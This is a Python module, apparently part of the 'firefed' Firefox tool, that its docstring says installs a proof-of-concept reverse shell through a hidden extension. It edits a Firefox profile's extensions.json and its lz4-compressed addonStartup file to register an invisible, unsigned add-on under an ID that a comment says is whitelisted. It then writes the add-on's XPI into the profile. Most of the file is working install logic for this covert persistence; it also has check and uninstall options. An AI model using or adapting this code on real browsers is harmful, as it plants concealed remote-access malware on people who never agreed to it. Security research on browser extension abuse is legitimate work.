import json
import os
from pathlib import Path
import sys
from zipfile import ZipFile

from attr import attrs
import lz4.block

from firefed.feature import Feature, arg
from firefed.output import bad, error, fatal, good, out


startup_key = 'app-system-defaults'
addon_id = '@testpilot-addon'  # ID is in whitelist for legacy extensions
addon_version = '1.0'
addon_path = 'infect@example.com.xpi'
addon_entry = {
    'id': addon_id,
    'syncGUID': 'infect',
    'location': startup_key,
    'version': addon_version,
    'type': 'extension',
    'internalName': None,
    'updateURL': None,
    'updateKey': None,
    'optionsURL': None,
    'optionsType': None,
    'aboutURL': None,
    'defaultLocale': {
        'name': 'infect',
        'description': 'This is the infect POC.',
        'creator': 'numirias',
    },
    'visible': False,
    'active': True,
    'userDisabled': False,
    'appDisabled': False,
    'installDate': 1461552448000,
    'updateDate': 1506403392000,
    'applyBackgroundUpdates': 1,
    'bootstrap': True,
    'path': None,  # Needs to be set
    'skinnable': False,
    'size': 962,
    'sourceURI': None,
    'releaseNotesURI': None,
    'softDisabled': False,
    'foreignInstall': False,
    'hasBinaryComponents': False,
    'strictCompatibility': False,
    'locales': [],
    'targetApplications': [
        {
            'id': '{ec8030f7-c20a-464f-9b0e-13a3a9e97384}',
            'minVersion': '1.0',
            'maxVersion': '*',
        }
    ],
    'targetPlatforms': [],
    'multiprocessCompatible': True,
    'signedState': 0,
    'seen': True,
    'dependencies': [],
    'hasEmbeddedWebExtension': False,
    'mpcOptedOut': False,
    'userPermissions': None,
    'icons': {},
    'iconURL': None,
    'icon64URL': None,
    'blocklistState': 0,
    'blocklistURL': None,
}
startup_entry = {
    'enabled': True,
    'lastModifiedTime': 1506403392000,
    'path': addon_path,
    'version': addon_version,
    'bootstrapped': True,
    'dependencies': [],
    'runInSafeMode': True,
    'hasEmbeddedWebExtension': False,
}

ADDON_STARTUP_FILE = 'addonStartup.json.lz4'
EXT_DIR = 'extensions'
EXT_DB = 'extensions.json'

ROOT_PATH = os.path.dirname(os.path.realpath(sys.modules['firefed'].__file__))


def make_addon_entry(path):
    entry = addon_entry.copy()
    entry['path'] = os.path.join(path, EXT_DIR, addon_path)
    return entry


@attrs
class Infect(Feature):
    """Install a PoC reverse shell via a hidden extension."""

    want_uninstall = arg('-u', '--uninstall', help='uninstall malicious addon',
                         action='store_true', default=False)
    want_check = arg('-c', '--check', help='check if profile appears infected',
                     action='store_true', default=False)
    yes = arg('-y', '--yes', help='don\'t prompt for confirmation',
              action='store_true', default=False)

    def run(self):
        self.read_extensions_json()
        self.read_addon_startup_json()
        addons = self.extensions_json['addons']
        addon = next((a for a in addons if a['id'] == addon_id), None)
        if self.want_uninstall:
            self.uninstall(addon)
        elif self.want_check:
            self.check(addon)
        else:
            self.install(addon)

    def check(self, addon):
        checks = (
            addon is not None,
            addon_id in self.addon_startup_json[startup_key]['addons'],
            Path(self.profile_path(os.path.join(EXT_DIR,
                                                addon_path))).is_file(),
        )
        if all(checks):
            out(good('Extension seems installed.'))
        else:
            out(bad('Extension doesn\'t seem fully installed.'))

    def uninstall(self, addon):
        out('Uninstalling...')
        addons = self.extensions_json['addons']
        try:
            addons.remove(addon)
        except ValueError:
            fatal('Can\'t remove addon from "%s". No entry found.' % EXT_DB)
        self.write_extensions_json()
        try:
            del self.addon_startup_json[startup_key]['addons'][addon_id]
        except KeyError:
            fatal('Can\'t remove addon entry from "%s". No entry found.' %
                  ADDON_STARTUP_FILE)
        self.write_addon_startup_json()
        target = self.profile_path(os.path.join(EXT_DIR, addon_path))
        try:
            os.remove(target)
        except FileNotFoundError:
            fatal('Can\'t remove XPI. File not found.')

    def install(self, addon):
        if not self.yes:
            out('Are you sure you want to infect profile "%s"? (y/N)' %
                self.session.profile)
            if input().lower() not in ['y', 'yes']:
                fatal('Cancelled.')
        out('Installing...')
        if addon is not None:
            error('Addon entry "%s" already exists.' % addon_id)
        else:
            addons = self.extensions_json['addons']
            addons.append(make_addon_entry(self.session.profile))
            self.write_extensions_json()

        startup = self.addon_startup_json
        if startup_key not in startup:
            startup[startup_key] = {}
        if 'addons' not in startup[startup_key]:
            startup[startup_key]['addons'] = {}
        if addon_id in startup[startup_key]['addons']:
            error('Addon already registered in "%s".' % ADDON_STARTUP_FILE)
        else:
            startup[startup_key]['addons'][addon_id] = startup_entry
            self.write_addon_startup_json()
        try:
            os.mkdir(self.profile_path(EXT_DIR))
        except FileExistsError:
            pass
        source = os.path.join(ROOT_PATH, 'data/infect/')
        target = self.profile_path(os.path.join(EXT_DIR, addon_path))
        if os.path.isfile(target):
            error('XPI file already exists.')
        else:
            out('Writing XPI file to "%s".' % target)
            with ZipFile(target, 'w') as f:
                for filename in os.listdir(source):
                    path = os.path.join(source, filename)
                    print('Adding "%s".' % filename)
                    f.write(path, filename)

    def read_extensions_json(self):
        with open(self.profile_path(EXT_DB)) as f:
            self.extensions_json = json.load(f)

    def write_extensions_json(self):
        out('Updating "extensions.json".')
        with open(self.profile_path(EXT_DB), 'w') as f:
            json.dump(self.extensions_json, f)

    def read_addon_startup_json(self):
        with open(self.profile_path(ADDON_STARTUP_FILE), 'rb') as f:
            if f.read(8) != b'mozLz40\0':
                raise Exception('Not Mozilla lz4 format.')
            data = lz4.block.decompress(f.read())
        self.addon_startup_json = json.loads(data)

    def write_addon_startup_json(self):
        compressed = lz4.block.compress(
            bytes(json.dumps(self.addon_startup_json), 'utf-8'))
        out('Updating "addonsStartup.json.lz4".')
        with open(self.profile_path(ADDON_STARTUP_FILE), 'wb') as f:
            f.write(b'mozLz40\0' + compressed)
